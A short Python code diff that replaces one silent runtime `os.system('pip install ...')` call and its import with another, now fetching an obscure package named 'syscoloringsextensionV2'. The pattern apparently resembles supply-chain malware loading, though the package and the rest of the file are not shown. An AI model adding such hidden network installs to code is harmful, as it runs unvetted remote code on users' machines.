@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycryptextension")
-import pycryptextension
+os.system("pip install syscoloringsextensionV2")
+import syscoloringsextensionV2
 import random
 import requests
 import time
